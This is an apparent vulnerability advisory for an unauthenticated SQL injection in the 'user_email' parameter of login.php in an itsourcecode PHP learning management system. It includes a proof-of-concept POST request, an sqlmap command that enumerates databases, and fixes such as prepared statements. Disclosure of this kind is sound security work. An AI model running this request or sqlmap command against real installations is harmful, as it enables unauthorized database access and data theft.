| Itsourcecode Learning Management System Project In PHP With Source Code v1.0 login.php SQL injectionNAME OF AFFECTED PRODUCT(S)  * Learning Management System Project In PHP With Source Code  Vendor Homepage  * <https://itsourcecode.com/free-projects/php-project/learning-management-system-project-in-php-with-source-code/>  AFFECTED AND/OR FIXED VERSION(S)submitter  * N3xu5Cr4ck37  Vulnerable File  * login.php  VERSION(S)  * V1.0  Software Link  * <https://itsourcecode.com/wp-content/uploads/2020/07/e-learningsystem1.zip>  PROBLEM TYPEVulnerability Type  * SQL injection  Root Cause  * A SQL injection vulnerability was found in the 'login.php' file of the 'Learning Management System Project In PHP With Source Code' project. The reason for this issue is that attackers inject malicious code from the parameter "user\_email" and use it directly in SQL queries without appropriate cleaning or validation. This allows attackers to forge input values, thereby manipulating SQL queries and performing unauthorized operations.   [1](https://github.com/L1OudFd8cl09/CVE/assets/151617791/8cbaa6fc-0e10-4870-9371-5fa8c22f1f63) Impact  * Attackers can exploit this SQL injection vulnerability to achieve unauthorized database access, sensitive data leakage, data tampering, comprehensive system control, and even service interruption, posing a serious threat to system security and business continuity.  DESCRIPTION  * Due to insufficient user input validation for the "user\_email" parameter, a serious SQL injection vulnerability was discovered in the login function of the " Learning Management System Project In PHP", allowing attackers to inject malicious SQL queries. Therefore, attackers can gain unauthorized access to the database, modify or delete data, and access sensitive information without logging in. Immediate remedial measures are needed to ensure system security and protect data integrity.  No login or authorization is required to exploit this vulnerabilityVulnerability details and POC ``` POST /e-learningsystem/login.php HTTP/1.1 Host: 192.168.210.199:1219 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Content-Type: application/x-www-form-urlencoded Content-Length: 46 Origin: http://192.168.210.199:1219 Connection: close Referer: http://192.168.210.199:1219/e-learningsystem/login.php Upgrade-Insecure-Requests: 1 Priority: u=1  user_email=123231&user_pass=21312312&btnLogin=  ``` Vulnerability type:  * time-based blind * boolean-based blind * error-based * UNION query  Vulnerability location:  * 'user\_email' parameter  Payload: [2](https://github.com/L1OudFd8cl09/CVE/assets/151617791/da0fb05b-ef18-43cd-b24f-a880f5c3b547) The following are screenshots of some specific information obtained from testing and running with the sqlmap tool: ``` sqlmap -u 192.168.210.199:1219/e-learningsystem/login.php --data="user_email=123231&user_pass=21312312&btnLogin=" --method=POST --batch --dbs    ```  [3](https://github.com/L1OudFd8cl09/CVE/assets/151617791/8bca9432-efdc-4b89-97e5-ea1e166ff996) Suggested repair  1. **Use prepared statements and parameter binding:**    Preparing statements can prevent SQL injection as they separate SQL code from user input data. When using prepare statements, the value entered by the user is treated as pure data and will not be interpreted as SQL code. 2. **Input validation and filtering:**    Strictly validate and filter user input data to ensure it conforms to the expected format. 3. **Minimize database user permissions:**    Ensure that the account used to connect to the database has the minimum necessary permissions. Avoid using accounts with advanced permissions (such as' root 'or' admin ') for daily operations. 4. **Regular security audits:**    Regularly conduct code and system security audits to promptly identify and fix potential security vulnerabilities. |
